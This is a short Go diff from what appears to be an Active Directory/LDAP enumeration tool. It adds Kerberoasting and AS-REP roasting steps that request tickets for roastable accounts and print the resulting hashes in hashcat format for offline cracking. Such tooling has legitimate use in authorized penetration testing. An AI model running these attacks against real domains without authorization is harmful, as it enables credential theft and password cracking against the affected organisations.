@@ -165,6 +165,15 @@ func runLDAP(cmd *cobra.Command, args []string) {
 						out.TreeDetail("SPN", spn, j == len(a.SPNs)-1)
 					}
 				}
+				hashes, err := ldapkrb.KerberoastActive(accounts, job.Cred.Username, job.Cred.Password, ldapDomain, job.Target)
+				if err != nil {
+					out.Failure(fmt.Sprintf("[Kerberoast] %s", err.Error()))
+				} else if len(hashes) > 0 {
+					out.Section("TGS Hashes (hashcat)", len(hashes))
+					for i, h := range hashes {
+						out.TreeEntryColored(h.Hash, core.ColorYellow, i == len(hashes)-1)
+					}
+				}
 			}
 		}
 
@@ -176,6 +185,12 @@ func runLDAP(cmd *cobra.Command, args []string) {
 				out.Section("AS-REP Roastable Accounts", len(accounts))
 				for i, a := range accounts {
 					out.TreeEntryColored(a.SAMAccountName, core.ColorYellow, i == len(accounts)-1)
+				}
+				if hashes := ldapkrb.ASREPRoastActive(accounts, ldapDomain, job.Target); len(hashes) > 0 {
+					out.Section("AS-REP Hashes (hashcat)", len(hashes))
+					for i, h := range hashes {
+						out.TreeEntryColored(h.Hash, core.ColorYellow, i == len(hashes)-1)
+					}
 				}
 			}
 		}
